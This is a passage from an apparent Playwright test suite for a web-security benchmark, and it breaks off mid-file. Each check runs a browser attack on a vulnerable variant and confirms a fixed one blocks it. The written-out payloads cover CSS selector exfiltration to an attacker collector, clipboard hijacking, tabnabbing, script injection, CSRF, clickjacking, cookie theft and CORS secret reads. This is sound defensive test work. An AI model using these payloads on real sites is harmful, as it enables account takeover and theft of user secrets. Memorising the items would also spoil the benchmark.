const e=encodeURIComponent;
const userState=async(t,name='alice')=>(await t.oracle()).users.find(item=>item.name===name);
const audit=async t=>(await t.oracle()).caseState.browserBatch;
const ready=async page=>{await page.waitForLoadState('load');await page.waitForTimeout(150);};
const marker=async(page,key='executed')=>await page.locator('body').getAttribute('data-'+key)==='yes';
const loginAt=async(t,target,name='alice',endpoint='/login')=>{const r=await t.context.request.post(target+new URL(t.base).pathname+endpoint,{data:{username:name,password:'Fixture-'+name+'-2026!'}});t.record.requests++;t.check(r.status()===200,'Normal fixture account signs into the selected actual origin');return r.json();};
const formURL=(t,target,fields,extra={})=>t.attacker+'/b2-form?'+new URLSearchParams({target,fields:JSON.stringify(fields),...extra});
async function externalForm(t,target,fields,extra={},source=t.attacker){
  const url=new URL(formURL(t,target,fields,extra));const supplied=new URL(source);url.hostname=supplied.hostname;url.port=supplied.port;
  await t.page.goto(url.href);await t.page.locator('#submit').click();await ready(t.page);
}
const browserFetch=async(page,url,headers={})=>page.evaluate(async({url,headers})=>{try{const response=await fetch(url,{credentials:'include',headers});return {status:response.status,body:await response.text(),requestId:response.headers.get('X-Request-ID'),internalKey:response.headers.get('X-Internal-Key')};}catch{return {blocked:true};}},{url,headers});
async function normalProfile(t,name='alice'){
  await t.login(name);await t.page.goto(t.base+'/b2-profile');const token=await t.page.locator('input[name=csrf]').inputValue();
  t.check(token.length>=32,'Normal profile form provides a real CSRF token');return token;
}
async function normalCookie(t,name='alice'){
  const response=await t.post('/b2-cookie-signin',{username:name,password:'Fixture-'+name+'-2026!'});t.check(response.status()===200,'Dedicated cookie login creates a real authenticated Redis session');return response.json();
}
async function openPopup(page,click){const pending=page.waitForEvent('popup');await click();const popup=await pending;await ready(popup);return popup;}

export const checks={
  R0023:async t=>{
    t.check((await t.get('/b2-css')).status()===401,'CSS member card requires a real authenticated principal');await t.login('bob');
    await t.page.goto(t.base+'/b2-css?cssRules='+e('#sample { color: rgb(0, 0, 255); }'));await ready(t.page);
    const sample=t.v?t.page.locator('#sample'):t.page.frameLocator('#css-card').locator('#sample');t.check(await sample.evaluate(node=>getComputedStyle(node).color)==='rgb(0, 0, 255)','Normal browser CSS still styles the sample in every arm');
    t.check((await audit(t)).receipts.length===0,'Normal CSS produces no collector receipts');
    const alphabet='0123456789abcdef';let inferred='canary_';
    for(let position=0;position<4;position++){
      const rules=[...alphabet].map(character=>`[data-secret^="${inferred+character}"] { background-image: url("${t.attacker}/b2-collect?value=${position+':'+character}"); }`).join('\n');
      await t.page.goto(t.base+'/b2-css?cssRules='+e(rules));await ready(t.page);const matched=(await audit(t)).receipts.filter(item=>item.kind==='css-image'&&item.value.startsWith(position+':'));
      t.check(matched.length===(t.v?1:0),'Actual CSS prefix enumeration emits one matching secret-character request only in V, position '+position);
      if(t.v)inferred+=matched[0].value.split(':')[1];
    }
    const receipts=(await audit(t)).receipts;t.check((inferred===t.c.slice(0,11))===t.v,'Browser image requests infer four initially unknown private fixture characters without placing the canary in the input');
    t.record.cssExtractionEvidence={knownPrefix:'canary_',inferredPrivateCharacters:t.v?inferred.slice(7):'',collectorRequests:receipts};
    if(!t.v)t.check(await t.page.locator('[data-secret]').count()===0,'Fixed member DOM contains no private selector attribute');
    const before=receipts.length;await t.page.goto(t.base+'/b2-css?cssRules='+e(`[data-secret="not-the-secret"] { background-image: url("${t.attacker}/b2-collect?value=nonmatch"); }`));await ready(t.page);
    t.check((await audit(t)).receipts.length===before,'A nonmatching CSS attribute selector never causes the image request');
  },
  R0043:async t=>{
    await t.context.grantPermissions(['clipboard-read','clipboard-write'],{origin:new URL(t.target).origin});
    await t.page.goto(t.base+'/b2-copy');await t.page.locator('#copy').click();await t.page.waitForFunction(()=>document.getElementById('status').textContent==='Copied');
    t.check(await t.page.evaluate(()=>navigator.clipboard.readText())==='account-alice','Normal copied value matches the actual displayed payee');
    await t.page.goto(t.base+'/b2-copy?copyTarget=account-bob');await t.page.locator('#copy').click();await t.page.waitForFunction(()=>document.getElementById('status').textContent==='Copied');
    const displayed=await t.page.locator('#payee').textContent(),copied=await t.page.evaluate(()=>navigator.clipboard.readText());
    t.check(displayed==='account-alice'&&copied===(t.v?'account-bob':'account-alice'),'Actual clipboard differs from the confirmed display only in V');
    t.record.clipboardEvidence={displayed,copied};
    await t.page.goto(t.base+'/b2-copy?copyTarget='+e('account-alice'));await t.page.locator('#copy').click();await t.page.waitForFunction(()=>document.getElementById('status').textContent==='Copied');
    t.check(await t.page.evaluate(()=>navigator.clipboard.readText())==='account-alice','A normal copy target remains correct after the boundary attempt');
  },
  R0044:async t=>{
    await t.page.goto(t.base+'/b2-external');const initial=t.page.url(),popup=await openPopup(t.page,()=>t.page.locator('#external').click());
    t.check(new URL(popup.url()).origin===new URL(t.attacker).origin&&await popup.locator('#related').count()===1,'Normal link opens the actual separate local HTTPS origin');
    t.check(await popup.evaluate(()=>opener!==null)===t.v,'Explicit opener reference exists only in V');await popup.locator('#replace-parent').click();await ready(t.page);
    t.check((await t.page.locator('#linked-login').count()===1)===t.v,'Separate-origin popup actually navigates the original page only in V');
    if(!t.v)t.check(t.page.url()===initial,'Noopener keeps the source page at its original location');await popup.close();
    t.check((await t.get('/b2-external?externalLink='+e('https://example.invalid/'))).status()===400,'Link fixture never opens an external internet origin');
  },
  R0046:async t=>{
    await t.login();await t.page.goto(t.base+'/b2-sensitive');t.check((await userState(t)).contact==='alice@example.test','Sensitive contact is at the actual reset value');
    await t.page.evaluate(key=>sessionStorage.setItem(key,'true'),new URL(t.base).pathname+':unlock');await t.page.locator('#sensitive button').click();await t.page.waitForFunction(()=>['200','403'].includes(document.getElementById('result').textContent));
    t.check(((await userState(t)).contact==='alice.updated@example.test')===t.v,'Changing only browser storage alters the real protected contact only in V');
    t.check((await t.post('/b2-confirm',{password:'wrong-password'})).status()===401,'Wrong confirmation password is rejected in every arm');
    t.check((await t.post('/b2-confirm',{password:'Fixture-alice-2026!'})).status()===200,'Real current password creates the server confirmation state');
    const normal=await t.post('/b2-sensitive',{contact:'alice.confirmed@example.test',unlockFlag:'true'});t.check(normal.status()===200&&(await userState(t)).contact==='alice.confirmed@example.test','Legitimate confirmation preserves actual sensitive update in every arm');
    await t.post('/logout',{});await t.login();const stale=await t.post('/b2-sensitive',{contact:'alice.replayed@example.test',unlockFlag:'true'});t.check((stale.status()===200)===t.v,'Server reauthentication authority is bound to the exact session rather than username alone');
  },
  R0047:async t=>{
    await t.page.goto(t.base+'/b2-attributes?attributeMap='+e('{"title":"Details","aria-label":"Open details"}'));
    t.check(await t.page.locator('#configured').getAttribute('title')==='Details'&&await t.page.locator('#configured').getAttribute('aria-label')==='Open details','Normal client setAttribute config preserves allowed attributes');
    const map={onclick:"document.body.dataset.executed='yes'",title:'Ordinary title'};await t.page.goto(t.base+'/b2-attributes?attributeMap='+e(JSON.stringify(map)));await t.page.locator('#configured').click();
    t.check(await marker(t.page)===t.v,'Real configured click handler executes only when client attribute names are unrestricted');
    t.check(await t.page.locator('#configured').getAttribute('title')==='Ordinary title','Allowed attribute still works beside the event-like key');
    await t.page.goto(t.base+'/b2-attributes?attributeMap='+e(JSON.stringify({title:map.onclick})));await t.page.locator('#configured').click();t.check(!await marker(t.page),'Event-looking text in a legitimate title never executes');
  },
  R0048:async t=>{
    await t.page.goto(t.base+'/b2-resource');await ready(t.page);t.check(await marker(t.page,'standard-loaded'),'Normal fixed script executes in every arm');
    await t.page.goto(t.base+'/b2-resource?scriptUrl='+e(t.attacker+'/b2-resource.js'));await ready(t.page);t.check(await marker(t.page,'foreign-executed')===t.v,'Actual foreign-origin script.src executes only in V');
    if(!t.v)t.check(await marker(t.page,'standard-loaded'),'Fixed local resource stays functional after an alternate URL setting');
    t.check((await t.get('/b2-resource?scriptUrl='+e('https://example.invalid/payload.js'))).status()===400,'Resource case only connects to finite local origins');
  },
  R0050:async t=>{
    await t.page.goto(t.base+'/b2-storage');t.check(await t.page.locator('#label').textContent()==='Welcome','Reset browser storage has the normal default config');
    await t.page.locator('#setting').fill('{"label":"Saved name"}');await t.page.locator('#save').click();t.check(await t.page.locator('#label').textContent()==='Saved name','Normal JSON configuration is saved and consumed');
    await t.page.locator('#setting').fill("({label:(document.body.dataset.executed='yes','Changed')})");await t.page.locator('#save').click();t.check(await marker(t.page)===t.v,'Actual eval of persisted browser configuration executes an expression only in V');
    const safe={label:"document.body.dataset.executed='yes'"};await t.page.goto(t.base+'/b2-storage');await t.page.locator('#setting').fill(JSON.stringify(safe));await t.page.locator('#save').click();
    t.check(await t.page.locator('#label').textContent()===safe.label,'JavaScript-looking label in valid JSON is data');
  },
  R0053:async t=>{
    await t.page.goto(t.base+'/b2-named');await ready(t.page);t.check(await marker(t.page,'standard-loaded'),'Normal card keeps the fixed client resource functional');
    const named='<a id="resourceConfig" href="'+t.attacker+'/b2-resource.js">Guide</a>';await t.page.goto(t.base+'/b2-named?namedElement='+e(named));await ready(t.page);
    t.check(await t.page.evaluate(()=>window.resourceConfig instanceof HTMLAnchorElement),'Real browser named property resolves to the attacker-selected safe anchor');
    t.check(await marker(t.page,'foreign-executed')===t.v,'Real named property changes the executed script URL only in V');
    t.check((await t.get('/b2-named?namedElement='+e('<img src=x onerror="alert(1)">'))).status()===400,'Card parser excludes a separate event/HTML injection vulnerability');
    const ordinary='<a id="guideLink" href="'+t.attacker+'/b2-resource.js">Guide</a>';await t.page.goto(t.base+'/b2-named?namedElement='+e(ordinary));await ready(t.page);t.check(await marker(t.page,'standard-loaded')&&!await marker(t.page,'foreign-executed'),'A noncolliding safe named link does not alter client resource config');
  },
  R0055:async t=>{
    await t.login('bob');await t.page.goto(t.base+'/b2-transfer');await t.page.locator('#transfer button').click();await ready(t.page);t.check((await t.oracle()).operations.some(item=>item.username==='bob'&&item.action==='browser-transfer'),'Normal form produces the actual successful transfer operation');
    t.check((await audit(t)).receipts.length===0,'Normal transfer emits no alternate-origin secret receipt');
    await t.page.goto(t.base+'/b2-transfer?formAction='+e(t.attacker+'/b2-collect'));await t.page.locator('#transfer button').click();await ready(t.page);
    t.check((await audit(t)).receipts.some(item=>item.kind==='form-transfer'&&item.accessKey===t.c)===t.v,'Actual browser form submission sends the private field to the separate local collector only in V');
    if(!t.v)t.check(new URL(t.page.url()).origin===new URL(t.target).origin,'Fixed form action remains within the normal application origin');
  },
  R0057:async t=>{
    await t.page.goto(t.base+'/b2-srcdoc?srcdoc='+e('<p>Welcome</p>'));await ready(t.page);t.check((await t.page.frameLocator('#html-card').locator('body').textContent()).includes('Welcome'),'Normal srcdoc card remains readable in every arm');
    const payload='<script>parent.document.body.dataset.executed="yes"</script>';await t.page.goto(t.base+'/b2-srcdoc?srcdoc='+e(payload));await ready(t.page);
    t.check(await marker(t.page)===t.v,'Actual srcdoc child writes into the parent DOM only in V');
    if(!t.v)t.check((await t.page.frameLocator('#html-card').locator('body').textContent()).includes(payload),'Fixed card preserves input as readable text inside sandbox');
  },
  R0058:async t=>{
    await t.login();t.check((await audit(t)).workerFiles.length===0,'Reset contains no user-provided worker code');
    await t.page.goto(t.base+'/b2-worker');await t.page.waitForFunction(()=>document.getElementById('worker-result').textContent==='Ready',null,{timeout:10000});
    const normal=await t.page.evaluate(()=>navigator.serviceWorker.getRegistration().then(registration=>registration.active.scriptURL));t.check(normal===t.base+'/b2-safe-worker.js','Actual trusted-TLS Service Worker registers the normal fixed file');
    await t.page.evaluate(async()=>{for(const registration of await navigator.serviceWorker.getRegistrations())await registration.unregister();});
    const source="self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));self.addEventListener('message',e=>{if(e.data==='check-worker')e.source.postMessage('worker-executed')});";
    const stored=await t.post('/b2-worker-files',{name:'member-notes',source}),url=(await stored.json()).url;t.check(stored.status()===200&&(await audit(t)).workerFiles.some(file=>file.name==='member-notes'),'User JavaScript is stored as an actual named file');
    await t.page.goto(t.base+'/b2-worker?workerPath='+e(new URL(url,t.target).href));await t.page.waitForFunction(()=>document.getElementById('worker-result').textContent==='Ready',null,{timeout:10000});await t.page.waitForFunction(()=>navigator.serviceWorker.controller!==null);
    const chosen=await t.page.evaluate(()=>navigator.serviceWorker.getRegistration().then(registration=>registration.active.scriptURL));t.check(chosen===(t.v?new URL(url,t.target).href:t.base+'/b2-safe-worker.js'),'Worker registration selects uploaded JavaScript only in V');
    await t.page.evaluate(()=>navigator.serviceWorker.controller.postMessage('check-worker'));await t.page.waitForTimeout(200);t.check((await t.page.locator('body').getAttribute('data-worker-message')==='worker-executed')===t.v,'Actual uploaded worker executes its message handler only in V');
    await t.page.evaluate(async()=>{for(const registration of await navigator.serviceWorker.getRegistrations())await registration.unregister();for(const cache of await caches.keys())await caches.delete(cache);});
  },
  R0060:async t=>{
    await t.page.goto(t.base+'/b2-template');t.check(await t.page.locator('#rendered').textContent()==='Welcome Alice','Normal documented name template is preserved');
    const template="Welcome {{ (document.body.dataset.executed='yes', name) }}";await t.page.goto(t.base+'/b2-template?templateHtml='+e(template));t.check(await marker(t.page)===t.v,'Actual client template expression executes JavaScript only in V');
    await t.page.goto(t.base+'/b2-template?templateHtml='+e('Welcome {{ name }} <script>alert(1)</script>'));t.check((await t.page.locator('#rendered').textContent()).includes('<script>alert(1)</script>')&&await t.page.locator('#rendered script').count()===0,'Template renderer text sink does not introduce a separate HTML injection');
  },
  R0232:async t=>{
    await normalCookie(t);const initial=await t.get('/b2-cookie-account');t.check(initial.status()===200&&(await initial.json()).username==='alice','Dedicated cookie authenticates the actual Alice server session');
    await t.page.goto(t.base+'/b2-cookie-signin');const cookie=await t.page.evaluate(()=>document.cookie),actual=(await t.context.cookies(t.target)).find(item=>item.name==='memberSession');
    t.check(!!actual&&cookie.includes('memberSession='+actual.value)===t.v,'Fixed auditing script can read the real authentication cookie only in V');
    t.check(actual.httpOnly===!t.v,'Browser cookie store reports the intended HttpOnly flag');
    await t.post('/b2-cookie-signout',{});t.check((await t.get('/b2-cookie-account')).status()===401,'Normal logout invalidates the actual dedicated Redis authentication');
  },
  R0233:async t=>{
    const target='https://app.benchmark.test:8443',base=target+new URL(t.base).pathname;
    await loginAt(t,target,'alice','/b2-cookie-signin');t.check((await t.context.request.get(base+'/b2-cookie-account')).status()===200,'Normal TLS dedicated authentication works in every arm');
    const cookie=(await t.context.cookies(target)).find(item=>item.name==='memberSession');t.check(cookie.secure===!t.v,'Browser has the intended real Secure cookie attribute');
    const plain=new URL(base+'/b2-cookie-observation');plain.protocol='http:';plain.port='8080';await t.page.goto(plain.href);await ready(t.page);
    const receipts=(await audit(t)).receipts.filter(item=>item.kind==='cookie-transport'&&!item.secure);t.check(receipts.length===1&&receipts[0].received===t.v,'Actual HTTP ingress receives the authentication identifier only in V');
    if(t.v)t.check(receipts[0].values.includes(cookie.value),'Recorded HTTP identifier is the exact authenticated cookie');
    t.check((await t.context.request.get(base+'/b2-cookie-account')).status()===200,'Normal HTTPS authentication still works after the HTTP observation');
  },
  R0235:async t=>{
    await normalCookie(t);const initial=await t.get('/b2-cookie-account');t.check((await initial.json()).username==='alice','Normal path-independent dedicated session belongs to Alice');
    await t.context.request.post(t.base+'/login',{data:{username:'bob',password:'Fixture-bob-2026!'}});t.record.requests++;const bridge=await t.get('/b2-cookie-bridge?username=bob');t.check(bridge.status()===200,'Separate application partition issues a real session only for its authenticated Bob');
    await t.page.goto(t.base+'/b2-cookie-account');const identity=JSON.parse(await t.page.locator('body').textContent()).username;t.check(identity===(t.v?'bob':'alice'),'Actual browser sends path-specific duplicate before root cookie and only V adopts the other application session');
    const cookies=await t.context.cookies(t.base+'/b2-cookie-account');t.check(cookies.filter(item=>item.name==='memberSession').length===(t.v?2:1),'Path cookie collision is an actual browser condition');
    if(!t.v)t.check(cookies.some(item=>item.name==='__Host-memberSession'&&item.secure&&item.path==='/'),'Fixed authentication uses a real Host-prefixed root cookie');
    t.check((await t.get('/b2-cookie-bridge?username=alice')).status()===403,'Bridge cannot mint another principal session without their credentials');
  },
  R0313:async t=>{
    const alice=await normalProfile(t);t.check((await t.post('/b2-profile',{contact:'alice.normal@example.test',csrf:alice})).status()===200,'Own session token changes the actual normal profile');
    await t.post('/logout',{});const bob=await normalProfile(t,'bob');t.check(bob!==alice,'Distinct authenticated sessions have distinct real CSRF tokens');
    const cross=await t.post('/b2-profile',{contact:'bob.changed@example.test',csrf:alice});t.check((cross.status()===200)===t.v&&((await userState(t,'bob')).contact==='bob.changed@example.test')===t.v,'Alice token mutates actual Bob contact only in V');
    t.check((await t.post('/b2-profile',{contact:'bob.normal@example.test',csrf:bob})).status()===200,'Current Bob token continues to support normal changes');
    t.check((await t.post('/b2-profile',{contact:'bob.invalid@example.test',csrf:'arbitrary-unknown-token'})).status()===403,'Unknown token is rejected even by the shared-set vulnerable implementation');
  },
  R0314:async t=>{
    const csrf=await normalProfile(t);t.check((await t.post('/b2-profile',{contact:'alice.normal@example.test',csrf})).status()===200,'Correctly issued normal double-submit or HMAC token works');
    const chosen='attackerchosenvalue';await externalForm(t,t.base+'/b2-profile',{contact:'alice.forged@example.test',csrf:chosen},{inject:chosen});
    t.check(((await userState(t)).contact==='alice.forged@example.test')===t.v,'Real same-site auxiliary page sets CSRF cookie and sends browser form; unsigned equality succeeds only in V');
    const stored=(await t.context.cookies(t.target)).find(item=>item.name==='profileCsrf');t.check(stored?.value===chosen,'The fixture actually injected the cookie rather than spoofing a raw Cookie header');
    await t.page.goto(t.base+'/b2-profile');const renewed=await t.page.locator('input[name=csrf]').inputValue();t.check((await t.post('/b2-profile',{contact:'alice.renewed@example.test',csrf:renewed})).status()===200,'Legitimate normal token issuance recovers after an injected unrelated cookie');
  },
  R0316:async t=>{
    const csrf=await normalProfile(t);t.check((await t.post('/b2-profile',{contact:'alice.normal@example.test',csrf})).status()===200,'Real token-protected POST updates the normal contact');
    await t.page.goto(t.attacker+'/b2-origin-page');await t.page.evaluate(url=>location.href=url,t.base+'/b2-profile?contact=alice.navigated@example.test');await ready(t.page);
    t.check(((await userState(t)).contact==='alice.navigated@example.test')===t.v,'Actual browser navigation performs an unauthorized GET state change only in V');
    const current=(await userState(t)).contact;await t.page.goto(t.base+'/b2-profile');t.check((await userState(t)).contact===current,'Normal GET without action data remains read-only');
  },
  R0319:async t=>{
    const csrf=await normalProfile(t);t.check((await t.post('/b2-profile',{contact:'alice.normal@example.test',csrf},{headers:{origin:new URL(t.target).origin}})).status()===200,'Exact ordinary origin preserves normal contact update');
    await externalForm(t,t.base+'/b2-profile',{contact:'alice.origin@example.test',csrf:'not-the-token'});
    t.check(((await userState(t)).contact==='alice.origin@example.test')===t.v,'Actual browser Origin with the correct hostname but different port passes substring validation only in V');
    const receipts=(await audit(t)).receipts;const source=new URL(t.attacker).origin;t.check(receipts.some(item=>item.origin===source)===t.v,'Real stored update receipt records the mismatched browser Origin only in V');
    t.record.originEvidence={allowed:new URL(t.target).origin,other:source};
  },
  R0323:async t=>{
    await t.page.goto(t.base+'/b2-signin');const csrf=await t.page.locator('input[name=csrf]').inputValue();const normal=await t.post('/b2-signin',{username:'alice',password:'Fixture-alice-2026!',csrf});t.check(normal.status()===200&&(await (await t.get('/session')).json()).username==='alice','Normal pre-login token authenticates a real Alice session');
    await t.post('/logout',{});await t.page.goto(t.base+'/b2-signin');await externalForm(t,t.base+'/b2-signin',{username:'bob',password:'Fixture-bob-2026!'});
    t.check(((await (await t.get('/session')).json()).username==='bob')===t.v,'Actual separate-origin login form changes the victim browser into the attacker account only in V');
    await t.page.goto(t.base+'/b2-signin');const renewed=await t.page.locator('input[name=csrf]').inputValue();t.check((await t.post('/b2-signin',{username:'alice',password:'Fixture-alice-2026!',csrf:renewed})).status()===200,'Normal login initiation remains functional after the external form attempt');
  },
  R0324:async t=>{
    await t.login();await t.page.goto(t.base+'/b2-client-profile');await t.page.locator('#save').click();await t.page.waitForFunction(()=>document.getElementById('save-result').textContent==='200');
    t.check((await audit(t)).drafts.some(item=>item.username==='alice'&&item.contact==='alice.updated@example.test')&&(await userState(t)).contact==='alice@example.test','Normal client operation saves the actual draft without publishing contact');
    await t.page.goto(t.base+'/b2-client-profile#'+e(new URL(t.base).pathname+'/b2-publish-contact'));await t.page.locator('#save').click();await t.page.waitForFunction(()=>document.getElementById('save-result').textContent==='200');
    t.check(((await userState(t)).contact==='alice.updated@example.test')===t.v,'Fragment-controlled client operation sends a valid protected token to the publish endpoint only in V');
    t.check((await t.post('/b2-publish-contact',{contact:'alice.invalid@example.test',csrf:'invalid'})).status()===403,'Protected endpoint itself still verifies real session CSRF in every arm');
  },
  R0325:async t=>{
    const target='https://app.benchmark.test:8443',source='https://attacker.test:8444',base=target+new URL(t.base).pathname;
    await t.page.goto(base+'/b2-cookie-signin');await t.page.locator('input[name=username]').fill('alice');await t.page.locator('input[name=password]').fill('Fixture-alice-2026!');await t.page.locator('form button').click();await ready(t.page);const session=JSON.parse(await t.page.locator('body').textContent());t.check(session.loggedIn&&session.username==='alice','Actual browser form issues the fresh authenticated cookie without API cookie normalization');t.check((await t.context.request.post(base+'/b2-profile',{data:{contact:'alice.normal@example.test',csrf:session.csrf}})).status()===200,'Normal token-bearing update works with the selected real cross-site cookie host');
    const cookie=(await t.context.cookies(target)).find(item=>item.name==='memberSession');t.check(cookie?.sameSite===(t.v?'Lax':'Lax'),'Chromium reports Lax effective behavior for omitted and explicit cookie attributes');
    await externalForm(t,base+'/b2-profile',{contact:'alice.fresh@example.test'}, {},source);
    const changed=(await userState(t)).contact==='alice.fresh@example.test';t.check(changed===t.v,'Actual cross-site top-level POST sends the fresh SameSite-unspecified authenticated cookie only in V');
    const receipts=(await audit(t)).receipts;t.check(receipts.some(item=>item.origin===source&&item.fetchSite==='cross-site')===t.v,'Browser-generated Sec-Fetch-Site records the real cross-site relationship for successful V mutation');
    t.record.browserCondition={appOrigin:target,attackerOrigin:source,freshCookie:true,sameSiteAttribute:t.v?'omitted':'Lax',browserGeneratedFetchSite:'cross-site'};
    await t.page.goto(base+'/b2-profile');t.check(await t.page.locator('#profile').count()===1,'Returning by ordinary top-level GET retains normal authenticated access');
  },
  R0326:async t=>{
    const csrf=await normalProfile(t);t.check((await t.post('/b2-profile',{contact:'alice.normal@example.test',csrf},{headers:{origin:new URL(t.target).origin}})).status()===200,'Normal exact-origin token form remains functional');
    await externalForm(t,t.base+'/b2-profile',{contact:'alice.site@example.test',csrf:'not-the-token'});t.check(((await userState(t)).contact==='alice.site@example.test')===t.v,'Same-site but distinct-origin browser form mutates the actual profile only in V');
    const receipts=(await audit(t)).receipts;t.check(receipts.some(item=>item.origin===new URL(t.attacker).origin&&item.fetchSite==='same-site')===t.v,'Stored ingress receipt proves the actual browser same-site condition for V');
  },
  R0330:async t=>{
    await t.login();await t.page.goto(t.base+'/b2-approval');await t.page.locator('#approve').click();await ready(t.page);t.check((await audit(t)).approvals.length===1,'Normal important-button click creates a real database approval');
    await t.page.goto(t.attacker+'/b2-frame?target='+e(t.base+'/b2-approval'));await ready(t.page);
    if(t.v){await t.page.frameLocator('#checkout').locator('#approve').click();await ready(t.page);}
    else t.check(await t.page.frameLocator('#checkout').locator('#approve').count()===0,'Frame-ancestors prevents the real important-button document loading in the foreign frame');
    t.check((await audit(t)).approvals.length===(t.v?2:1),'Only the actually frameable arm creates an additional approval from the foreign frame');
    t.check((await t.post('/b2-approval',{csrf:'invalid'})).status()===403,'Approval endpoint retains token verification in every arm');
  },
  R0331:async t=>{
    await t.login('bob');const normal=await t.get('/b2-report');t.check(normal.status()===200&&(await normal.text()).includes(t.c),'Normal authenticated owner reads the actual secret report');
    await t.page.goto(t.attacker+'/b2-origin-page');const actual=await browserFetch(t.page,t.base+'/b2-report');t.check((actual.body?.includes(t.c)||false)===t.v,'Actual arbitrary-origin browser JS reads credentialed secret body only in V');
    if(!t.v)t.check(actual.blocked,'Browser CORS enforcement blocks the fixed read');t.record.corsEvidence=actual;
    await t.post('/logout',{});const unauthenticated=await browserFetch(t.page,t.base+'/b2-report');t.check(!unauthenticated.body?.includes(t.c),'Origin reflection does not remove normal server session authentication');
  },
  R0333:async t=>{
    const target='https://app.benchmark.test:8443',base=target+new URL(t.base).pathname;await loginAt(t,target,'bob');
    await t.page.goto('https://partner.benchmark.test:8444/b2-origin-page');const partner=await browserFetch(t.page,base+'/b2-report');t.check(partner.body?.includes(t.c),'Normally registered partner subdomain reads the actual credentialed report in every arm');
    await t.page.goto('https://evil.benchmark.test:8444/b2-origin-page');const other=await browserFetch(t.page,base+'/b2-report');t.check((other.body?.includes(t.c)||false)===t.v,'Actual unregistered sibling subdomain reads the secret only with broad subdomain CORS');
    if(!t.v)t.check(other.blocked,'Exact fixed allowlist blocks the unregistered real subdomain');t.record.corsEvidence={partner,other};
    t.check(new URL(t.page.url()).hostname==='evil.benchmark.test','Origin test uses a real browser-resolved sibling hostname');
  },
  R0337:async t=>{
    await t.login('bob');t.check((await t.get('/b2-report')).status()===200,'Normal authenticated same-origin report is available');await t.page.goto(t.attacker+'/b2-origin-page');
    const preflighted=await browserFetch(t.page,t.base+'/b2-report',{'X-Report-Request':'normal'});t.check(preflighted.blocked,'Actual non-simple browser request fails the preflight in every arm');
    const simple=await browserFetch(t.page,t.base+'/b2-report');t.check((simple.body?.includes(t.c)||false)===t.v,'Actual simple browser GET bypasses preflight-only checking and reads the secret only in V');
    if(!t.v)t.check(simple.blocked,'Fixed main response applies origin restrictions too');t.record.corsEvidence={preflighted,simple};
  },
  R0338:async t=>{
    await t.login('bob');await t.page.goto(t.attacker+'/b2-origin-page');const result=await browserFetch(t.page,t.base+'/b2-report');
    t.check(result.status===200&&JSON.parse(result.body).count===12&&!result.body.includes(t.c),'Registered origin reads only the public statistics body normally');
    t.check(result.requestId==='public-report','Normal public exposed request header remains readable');t.check((result.internalKey===t.c)===t.v,'Actual registered-origin JS reads the internal secret response header only in V');
    const sameOrigin=await t.get('/b2-report');t.check((sameOrigin.headers()['x-internal-key']===t.c)===t.v,'Fixed response removes the private header rather than only hiding it with CORS');
    t.record.corsEvidence=result;
  },
  R0340:async t=>{
    await t.login();const source=new URL(t.attacker).origin;const before=await audit(t);t.check(!before.corsPolicy.includes(source),'Reset shared origin policy excludes the auxiliary origin');
    const update=await t.post('/b2-cors-policy',{allowedOrigin:source});t.check((update.status()===200)===t.v&&(await audit(t)).corsPolicy.includes(source)===t.v,'Actual shared Redis CORS policy is mutable by ordinary Alice only in V');
    await t.post('/logout',{});await t.login('bob');await t.page.goto(t.attacker+'/b2-origin-page');const result=await browserFetch(t.page,t.base+'/b2-report');t.check((result.body?.includes(t.c)||false)===t.v,'Modified shared policy exposes another authenticated principal actual secret to the browser only in V');
    await t.post('/logout',{});await t.login('admin');t.check((await t.post('/b2-cors-policy',{allowedOrigin:source})).status()===200,'Legitimate administrator can update the shared policy in every arm');
    await t.post('/logout',{});await t.login('bob');const allowed=await browserFetch(t.page,t.base+'/b2-report');t.check(allowed.body?.includes(t.c),'Authorized policy change preserves the normal actual registered-origin integration');
    t.check((await t.post('/b2-cors-policy',{allowedOrigin:'https://example.invalid'})).status()===(t.v?400:403),'Finite lab policy never registers an external internet origin');
  },
  R0346:async t=>{
    await t.login('bob');await t.page.goto(t.base+'/b2-message-client');const normal=await openPopup(t.page,()=>t.page.locator('#open-hub').click());await t.page.locator('#request').click();await t.page.waitForFunction(()=>document.getElementById('message-result').textContent!=='Waiting');t.check((await t.page.locator('#message-result').textContent()).includes(t.c),'Normally opened same-origin client receives the real authenticated report');await normal.close();
    await t.page.goto(t.attacker+'/b2-origin-page');const popup=await openPopup(t.page,()=>t.page.evaluate(url=>{window.hub=window.open(url,'external-report-hub');},t.base+'/b2-message-hub'));
    await t.page.evaluate(origin=>window.hub.postMessage({kind:'read-report'},origin),new URL(t.target).origin);await t.page.waitForTimeout(200);
    t.check((await t.page.locator('#received').textContent()).includes(t.c)===t.v,'Actual external opener window receives a private postMessage response only when origin validation is missing');
    await popup.close();
  },
  R0347:async t=>{
    await t.login('bob');await t.page.goto(t.base+'/b2-message-client');const popup=await openPopup(t.page,()=>t.page.locator('#open-hub').click());await t.page.locator('#request').click();await popup.waitForFunction(()=>document.getElementById('hub-status').textContent==='Registered');await popup.locator('#send-report').click();await t.page.waitForFunction(()=>document.getElementById('message-result').textContent!=='Waiting');
    t.check((await t.page.locator('#message-result').textContent()).includes(t.c),'Normally registered same-origin WindowProxy receives the report in every arm');
    await t.page.goto(t.attacker+'/b2-origin-page');await popup.locator('#send-report').click();await t.page.waitForTimeout(200);
    t.check((await t.page.locator('#received').textContent()).includes(t.c)===t.v,'Actual navigated recipient WindowProxy receives the private report only with wildcard targetOrigin');
    t.check(new URL(t.page.url()).origin===new URL(t.attacker).origin,'Recipient truly navigated to the different origin before the send');await popup.close();
  },
  R0470:async t=>{
    await t.page.goto(t.base+'/b2-jsonp-panel');await ready(t.page);t.check(await t.page.locator('#notice').textContent()==='Welcome partner','Normal partner notice is rendered under the real CSP in every arm');
    const callback='(()=>{document.body.dataset.executed="yes"})';await t.page.goto(t.base+'/b2-jsonp-panel?jsonp='+e(callback));await ready(t.page);t.check(await marker(t.page)===t.v,'Actual CSP-allowed JSONP callback executes injected JS only in V');
    await t.page.goto(t.base+'/b2-jsonp-panel?jsonp=renderNotice');await ready(t.page);t.check(await t.page.locator('#notice').textContent()==='Welcome partner'&&!await marker(t.page),'Ordinary callback remains a valid data-rendering control');
    t.record.cspEvidence={positiveSource:'finite auxiliary JSONP origin',fixed:'JSON data and fixed nonce script'};
  },
  R0472:async t=>{
